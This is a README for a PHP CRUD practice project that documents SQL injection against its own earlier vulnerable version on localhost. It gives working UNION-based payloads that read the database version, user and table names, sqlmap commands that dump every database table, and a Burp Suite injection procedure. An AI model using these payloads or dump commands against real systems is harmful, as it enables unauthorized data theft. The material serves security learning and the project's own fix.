# crud_php_v2 with SQL Injection fix

<!-- 
De aqui hacia abajo se trata de documentar este proyecto
La gran aprte de la documentacion viene comentado en el archivo de conexion de base de datos
-->

PHP, CSS and native Javascript were used

## Acknowledgements

 - [PHP Elephant](https://www.php.net/manual/es/index.php)
 - [Rasmus Lerdorf](https://toys.lerdorf.com/)
 - [To my family and loved ones](https://github.com/devSecD)

## Authors

- [@devSecD](https://github.com/devSecD)

## Deployment

To deploy this project run

For local environment:
- Xampp (cross-platform)
- WampServer (windows)
- LAMP (linux)

## Features

- Continue discovering vulnerabilities and fixing them
- Refactor Code
- Add unit tests

## Built with

- Native PHP in version 8.1.12
- native HTML
- Native CSS
- Native Javascript

## Link references

- [Php](https://www.php.net/manual/es/index.php)

## Documentation

### Manual SQLi

* First we test if it is prone to an attack from the vulnerability
For this we look for the url where it has a parameter and at the end we add a single quote
* Later we perform the attack based on union
```
crud_php_v1/form_update.php?id=3%27%20UNION%20ALL%20SELECT%20NULL--%20-
```
```
SELECT * FROM persona WHERE id = '3' UNION ALL SELECT NULL;-- -'
```
* We must do this until it no longer errors
```
SELECT * FROM persona WHERE id = '3' UNION ALL SELECT NULL,NULL,NULL,NULL;-- -'
```
* We change the condition so that it can show us all the columns that we want to come after the union, in the end the url would look like this
```
http://localhost/crud_php_v1/form_update.php?id=10%27%20UNION%20ALL%20SELECT%20%27A%27,%20@@version,user(),database()--%20-

**@@version** - database manager version
**user()** - database user
**database()** - database name
```

* Afterwards we do the following
```
http://localhost/crud_php_v1/form_update.php?id=10%27%20UNION%20ALL%20SELECT%20NULL%20,group_concat(table_name),user(),4%20from%20information_schema.tables%20where%20table_schema=database()--%20-

group_concat(table_name) and from information_schema.columns where table_schema=database() - makes a concatenation of all the names in the database
```

#### Research links

- [SQLite online](https://sqliteonline.com/)
- [SQL UNION operator](https://www.w3schools.com/sql/sql_union.asp)
- [Web base for sql injection attack](https://www.infosecinstitute.com/resources/hacking/dumping-a-database-using-sql-injection/)

### SQLi con SQLMap

* We dump the database. With this we will obtain the name of the database
```
sqlmap -u "vulnerable_url" --dbs
```
* We add all the tables in the database. With this we will obtain all the tables of the desired database
```
sqlmap -u "vulnerable_url" -D name_database --dump-all --batch
```
#### Research links

- [Web official SQLMap](https://sqlmap.org/)
- [Features SQLMap](https://github.com/sqlmapproject/sqlmap/wiki/Features)
- [Presentations SQLMap](https://github.com/sqlmapproject/sqlmap/wiki/Presentations)
- [GitHub SQLMap](https://github.com/sqlmapproject/sqlmap)
- [FAQ SQLMap](https://github.com/sqlmapproject/sqlmap/wiki/FAQ)
- [Web base for sql injection attack](https://secnhack.in/multiple-ways-to-dump-website-database-via-sqlmap/)


### SQLi with Software Proxy (Burp Suite - Community Edition)

* [Download the version that will be used](https://portswigger.net/burp/communitydownload)
* We open burp suite and click on the default options of the first two screens.
* We select the tab that says "Proxy"
* Click on the "intercept on" button
* Click on the "open browser" button
* The browser will open and we will access the url that we want to intercept the http(s) request
* We give it "forward" ("next") until the url page finishes loading
* In the history we can see the request and response of that url
* sql injection test string - this is put in the value of the burp suite
```
UNION ALL SELECT 'A', @@version,user(),database()-- -
```

#### Research links

- [Burp Suite Documentation](https://portswigger.net/burp/documentation/desktop)
- [Requirements](https://portswigger.net/burp/documentation/desktop/getting-started/system-requirements)
- [Quick Start Guide](https://portswigger.net/burp/documentation/desktop/getting-started)
- [General documentation about SQLi](https://portswigger.net/web-security/sql-injection)
- [Solution to SQL injection vulnerability](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)